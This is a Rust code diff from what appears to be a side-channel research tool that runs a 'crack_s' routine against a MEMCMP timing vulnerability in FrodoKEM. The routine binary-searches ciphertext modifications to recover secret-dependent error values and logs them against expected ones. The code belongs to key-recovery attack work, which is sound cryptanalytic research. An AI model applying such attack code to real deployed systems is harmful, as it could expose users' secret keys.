@@ -19,12 +19,11 @@ fn search_modification<FRODO: FrodoKem>(
     shared_secret_d: &mut FRODO::SharedSecret,
     secret_key: &mut FRODO::SecretKey,
 ) -> Result<u16, String> {
-    let maxmod = max_mod::<FRODO>();
-    warn!("TODO: check if max_mod is correctly used here");
+    let maxmod = error_correction_limit::<FRODO>() * 2;
     let mut high = maxmod;
     let mut low = 0;
     let found = loop {
-        let currentmod: u16 = ((high as usize + high as usize + low as usize) as usize / 3)
+        let currentmod: u16 = ((high as usize + low as usize) / 2)
             .try_into()
             .map_err(|_| "overflow")?;
         debug!("high: {}, low: {}", high, low);
@@ -86,6 +85,7 @@ pub fn crack_s<FRODO: FrodoKem>(
     profileiters: usize,
     measure_source: MeasureSource,
 ) -> Result<(), String> {
+    #![allow(non_snake_case)]
     info!(
         "Launching the crack_s routine against {} MEMCMP vulnerability.",
         FRODO::name()
@@ -108,24 +108,22 @@ pub fn crack_s<FRODO: FrodoKem>(
         &mut secret_key,
     )?;
 
-    let n = FRODO::params().PARAM_N;
-    let nbar = FRODO::params().PARAM_NBAR;
+    //let n = FRODO::params().PARAM_N;
+    let nbar: usize = FRODO::params().PARAM_NBAR;
     let mbar = nbar;
-    let err_corr_limit = max_mod::<FRODO>();
+    let err_corr_limit = error_correction_limit::<FRODO>();
+    let nbr_encaps = 1;
+    let i = mbar - 1;
 
-    for t in 0..n {
-        info!(
-            "Using MODCAPS to generate fake ciphertext with S' = 0, E'' = 0 and with E'[{},{}] = 1",
-            mbar - 1,
-            t
-        );
-
-        //TODO modified encaps
+    for t in 0..nbr_encaps {
+        info!("Using encaps to generate ciphertext number: {}", t);
         FRODO::encaps(&mut ciphertext, &mut shared_secret_e, &mut public_key)?;
+        let expectedEppp = FRODO::calculate_Eppp(&mut ciphertext, &mut secret_key)?;
+        let expectedEppp = expectedEppp.as_slice();
 
         for j in 0..nbar {
             // Modify ciphertext at C[nbar-1, j]
-            let index = (mbar - 1) * nbar + j;
+            let index = i * nbar + j;
 
             let x0 = search_modification::<FRODO>(
                 index,
@@ -138,7 +136,10 @@ pub fn crack_s<FRODO: FrodoKem>(
             )?;
 
             let Eppp_ij = err_corr_limit - x0;
-            info!("Found -S[{},{}]={}", t, j, Eppp_ij);
+            info!(
+                "Found -E'''[{},{}]={} expected: {}",
+                i, j, Eppp_ij, expectedEppp[index]
+            );
         }
     }
 
